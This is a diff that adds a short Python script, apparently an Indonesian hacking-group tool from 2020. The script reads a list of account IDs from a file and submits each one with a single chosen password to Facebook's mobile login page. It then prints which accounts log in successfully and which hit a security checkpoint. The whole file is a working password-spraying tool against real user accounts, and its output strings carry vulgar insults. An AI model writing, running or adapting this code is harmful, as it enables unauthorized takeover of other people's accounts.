@@ -1,0 +1,41 @@
+#!/usr/bin/python3
+
+
+import pyfiglet
+import requests
+
+print ("________________/\_______________")
+print (" author : Omest A.k.a 1gn1t31337 ")
+print (" team : Black Coder Crush | 2018 ")
+print (" program : python3 ")
+print (" date : saturday > 02 - 05 - 2020 ")
+print (" contact : telegram || @rusakutub ")
+print ("________________\/_______________")
+print("")
+
+id = input(" \033[33;1m masukkan list id : ")
+pw = input(" \033[35;1m masukkan password nya : ")
+
+def memek(id,pw):
+	link = "https://m.facebook.com/login.php"
+	data = {"email":id, "pass":pw}
+	r = requests.post(link, data=data)
+	if "kontol" in r.url or "m_sess" in r.url:
+		print (" \033[32;1mhore berhasil! "+ id + " > "+ pw)
+	elif "checkpoint" in r.url:
+		print (" \033[31;1m mampus checkpoint  "+ id + " > " + pw)
+	else:
+		print (" \033[30;2m gagal tolol \033[31;1m >  "+ id )
+
+def kontol(id,pw):
+	file = open(id, "r").readlines()
+	for i in file:
+		memek(i.strip(),pw)
+
+try: 
+	kontol(id,pw)
+
+except:
+        exit()
+ascii_banner = pyfiglet.figlet_format("GoodJobIdiot")
+print(ascii_banner)
